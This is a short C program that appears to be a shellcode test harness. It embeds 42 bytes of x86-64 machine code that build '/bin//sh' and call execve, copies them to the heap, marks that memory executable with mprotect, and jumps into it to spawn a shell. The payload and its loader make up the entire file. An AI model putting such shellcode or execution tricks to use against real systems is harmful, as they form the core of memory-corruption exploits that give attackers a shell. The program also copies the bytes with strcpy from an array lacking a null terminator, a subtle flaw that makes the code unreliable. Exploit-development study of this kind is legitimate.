#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

int main()
{
        unsigned char code[] = {
                0x48, 0x31, 0xd2, 0x52, 0x66, 0xbb, 0x73, 0x68, 0x66, 0x53, 0x48, 0x89,
                0xe3, 0x52, 0x53, 0x48, 0x89, 0xe6, 0x52, 0x48, 0xbb, 0x2f, 0x62, 0x69,
                0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0,
                0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05
        };
        unsigned int shellcode_size = 42;
        char* shellcode = (char*)malloc(shellcode_size + 1);
        strcpy(shellcode, code);

        uintptr_t pagesize = sysconf(_SC_PAGE_SIZE);
        uintptr_t pagestart = (uintptr_t)(shellcode) & ~(pagesize-1);
        uintptr_t pageend = ((uintptr_t)(shellcode + shellcode_size) + pagesize-1) & ~(pagesize-1);
        mprotect((void*)pagestart, pageend - pagestart, PROT_READ|PROT_WRITE|PROT_EXEC);

        (*(void(*)())shellcode)();

        return 0;
}
